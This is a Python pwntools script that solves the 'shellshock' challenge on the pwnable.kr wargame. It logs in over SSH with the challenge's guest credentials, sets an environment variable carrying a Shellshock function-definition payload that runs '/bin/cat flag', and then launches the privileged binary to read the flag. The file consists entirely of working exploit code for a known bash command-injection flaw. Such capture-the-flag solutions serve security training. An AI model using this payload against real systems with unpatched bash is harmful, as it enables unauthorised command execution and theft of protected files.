#!/usr/bin/python

#shellshock from pwnable.kr

from pwn import * 

def main():
    s = s = ssh(host="pwnable.kr", user="shellshock", password="guest", port=2222)
    sh = s.process(["bash"])
    sh.sendline('export x="() { :; }; /bin/cat flag;"')
    sh.sendline("./shellshock")
    log.info(sh.recvline())

if __name__=="__main__":
    main()
